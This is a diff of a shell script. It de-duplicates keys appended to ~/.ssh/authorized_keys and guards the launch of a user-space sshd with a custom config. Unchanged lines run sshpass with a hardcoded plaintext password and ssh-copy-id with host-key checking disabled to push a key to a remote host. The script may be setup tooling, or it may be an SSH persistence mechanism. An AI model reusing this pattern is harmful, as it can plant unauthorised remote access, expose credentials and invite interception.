@@ -33,7 +33,15 @@ chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
-printf "%s\n" "$KEYS" >> ~/.ssh/authorized_keys
+echo "$KEYS" | while read -r single_key; do
+    [ -z "$single_key" ] && continue
+    if ! grep -Fxq "$single_key" ~/.ssh/authorized_keys; then
+        printf "%s\n" "$single_key" >> ~/.ssh/authorized_keys
+        echo "[+] Appended new key: ${single_key:0:30}..."
+    else
+        echo "[-] Key already exists, skipping."
+    fi
+done
 
 mkdir -p "$HOME/.local/bin" 2>/dev/null
 requiredSettings="
@@ -65,7 +73,13 @@ HostKey $key_path
 
 echo "$requiredSettings" > "$HOME/.ssh/sshd_config"
 
-/usr/sbin/sshd -f "$HOME/.ssh/sshd_config"
+CONFIG_PATH="$HOME/.ssh/sshd_config"
+
+if pgrep -f "sshd.*-f $CONFIG_PATH" >/dev/null; then
+    echo "User-space sshd is already running. Skipping."
+else
+    /usr/sbin/sshd -f "$CONFIG_PATH"
+fi
 
 sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "${key_path}.pub" "$user@$domain_name"
 
